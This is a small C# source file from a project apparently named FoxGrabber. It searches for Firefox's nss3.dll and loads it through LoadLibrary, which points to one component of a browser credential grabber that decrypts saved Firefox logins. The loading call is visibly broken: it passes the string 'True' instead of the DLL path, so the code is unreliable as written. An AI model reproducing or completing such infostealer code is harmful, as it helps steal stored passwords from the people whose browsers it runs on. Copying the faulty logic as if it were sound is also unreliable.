using System;

namespace FoxGrabber
{
    public class LoaderDLL
    {
        public static void GetNSSLibrary()
        {
            for (int i = 0; i < Searcher.GetDLLFox.Count; i++)
            {
                //if (Searcher.GetDLLFox[i].Contains("nss3.dll"))
                bool NSS3DLL = Searcher.GetDLLFox[i].EndsWith("nss3.dll");
                bool NSS3DLLCont = Searcher.GetDLLFox[i].Contains("nss3.dll");

                if (!NSS3DLL)
                {
                    Console.WriteLine(Searcher.GetDLLFox[i]);
                }
                if (NSS3DLLCont)
                {
                    NSS._nssModule = NativeMethods.LoadLibrary(NSS3DLLCont.ToString());
                }
                
            }
        }
    }
}